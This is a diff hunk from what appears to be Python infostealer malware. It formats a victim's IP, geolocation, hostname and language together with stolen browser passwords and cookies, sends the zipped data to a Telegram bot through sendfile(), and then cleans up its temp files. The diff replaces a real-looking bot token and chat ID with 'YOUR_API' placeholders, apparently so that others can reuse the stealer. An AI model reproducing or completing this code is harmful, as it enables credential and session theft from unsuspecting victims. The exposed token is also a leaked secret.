@@ -743,8 +743,8 @@ async def main():
 
     body = f"<==== @asproozz01 ====>\n⏰ Date => {datetime.now().strftime('%d/%m/%Y %H:%M')}\n🔍 IP => {ip}\n📡 Location => {location}\n🛜 Hostname => {host}\n🏴 Country => {country}\n🏳‍🌈 Province => {province}\n🚩 City => {city}\n📝 Language => {language}\n====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
 
-    TOKEN = "6659280804:AAGawe8k8vGqyam9GHm4GEDA4BIQi3xec7E"
-    ID = "-1002022378614"
+    TOKEN = "YOUR_API"
+    ID = "YOUR_CHAT_ID"
     
     await sendfile(TOKEN, ID, z_ph, body)
     shutil.rmtree(os.environ["TEMP"], name_f + ".zip")
